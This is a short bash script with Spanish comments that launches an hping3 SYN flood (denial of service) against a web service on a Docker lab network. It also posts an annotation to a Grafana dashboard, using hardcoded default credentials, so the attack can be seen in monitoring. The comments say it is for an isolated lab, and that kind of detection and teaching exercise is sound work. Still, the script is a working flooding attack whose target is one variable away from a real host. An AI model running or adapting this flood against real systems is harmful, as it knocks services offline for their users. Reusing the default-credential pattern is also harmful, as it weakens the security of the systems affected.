#!/bin/bash
# Denegacion de servicio (hping3 SYN flood) contra el servicio academico del
# laboratorio. Se corre DENTRO del contenedor "atacante":
#   docker compose exec atacante bash /attack/dos.sh
#
# Duracion por defecto: 15 segundos (DURACION_SEG). No usar fuera del
# entorno de laboratorio aislado (lab-net).
set -e

OBJETIVO_IP="${OBJETIVO_IP:-172.28.0.10}"
GRAFANA_URL="${GRAFANA_URL:-http://grafana:3000}"
GRAFANA_USER="${GRAFANA_USER:-admin}"
GRAFANA_PASSWORD="${GRAFANA_PASSWORD:-admin123}"
DURACION_SEG="${1:-15}"

if ! command -v hping3 >/dev/null 2>&1; then
  echo "[dos] instalando hping3..."
  apt-get update -qq && apt-get install -y -qq hping3 curl >/dev/null
fi

INICIO="$(date -u +%Y-%m-%dT%H:%M:%S.000Z)"
echo "[dos] inicio del ataque: $INICIO (duracion: ${DURACION_SEG}s)"

curl -s -u "${GRAFANA_USER}:${GRAFANA_PASSWORD}" -X POST \
  -H "Content-Type: application/json" \
  -d "{\"text\":\"Inicio denegacion de servicio (hping3) contra ${OBJETIVO_IP}\",\"tags\":[\"ataque\",\"dos\"]}" \
  "${GRAFANA_URL}/api/annotations" >/dev/null || echo "[dos] aviso: no se pudo anotar en Grafana"

echo "[dos] lanzando hping3 --flood contra ${OBJETIVO_IP} durante ${DURACION_SEG}s..."
timeout "${DURACION_SEG}" hping3 -S --flood -p 80 "${OBJETIVO_IP}" || true

echo "[dos] ataque finalizado. Revisa el dashboard de Grafana (http://localhost:3000)."
